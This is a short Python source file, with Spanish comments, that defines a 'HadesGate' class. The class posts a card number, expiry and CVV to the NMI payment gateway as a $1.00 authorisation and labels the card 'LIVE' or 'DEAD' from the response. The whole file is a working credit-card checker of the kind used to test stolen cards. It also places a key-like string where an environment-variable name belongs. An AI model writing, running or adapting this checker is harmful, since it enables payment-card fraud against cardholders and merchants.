import requests
import os

class HadesGate:
    """
    💀 HADES GATEWAY - NMI (NETWORK MERCHHANTS INC) 💀
    TYPE: DIRECT POST (RAW AUTH/SALE)
    """
    @staticmethod
    def check_hades(cc, mm, yy, cvv):
        # TU LLAVE DE SEGURIDAD NMI (Security Key)
        # Puedes probar con llaves demo o tu propia API Key de NMI
        security_key = os.getenv("3ZhRAX-QU739U-cnD99F-Stc7ZV")
        
        # Endpoint Directo de NMI
        url = "https://secure.nmi.com/api/transact.php"
        
        # Payload para transacción directa
        payload = {
            'security_key': security_key,
            'type': 'auth', # O 'sale' para cobrar directo
            'amount': '1.00',
            'ccnumber': cc,
            'ccexp': f"{mm}{yy[-2:]}", # Formato MMYY
            'cvv': cvv,
            'first_name': 'Test',
            'last_name': 'User',
            'email': 'test@hades.gate',
            'payment_token': 'auto' # Opcional
        }
        
        try:
            r = requests.post(url, data=payload, timeout=20)
            data = r.text # NMI responde en formato text/key-value
            
            # Parseamos la respuesta (responsetext=...&response_code=...)
            res_dict = {}
            for pair in data.split('&'):
                if '=' in pair:
                    key, value = pair.split('=', 1)
                    res_dict[key] = value
            
            # --- ANÁLISIS DEL JUICIO DE HADES ---
            response_code = res_dict.get('response', '3') # 1=Approved, 2=Declined, 3=Error
            text_response = res_dict.get('responsetext', 'Unknown Error')
            auth_code = res_dict.get('authcode', '')

            if response_code == '1':
                return {
                    "status": "LIVE ✅",
                    "msg": "APPROVED (Honored)",
                    "auth": auth_code,
                    "charge": "$1.00"
                }
            elif response_code == '2':
                return {
                    "status": "DEAD ❌",
                    "msg": text_response.upper(),
                    "auth": "N/A",
                    "charge": "$0.00"
                }
            else:
                return {
                    "status": "ERROR ⚠️",
                    "msg": text_response.upper(),
                    "auth": "N/A",
                    "charge": "N/A"
                }

        except Exception as e:
            return {"status": "ERROR 💀", "msg": f"SYSTEM: {str(e)}", "charge": "N/A"}
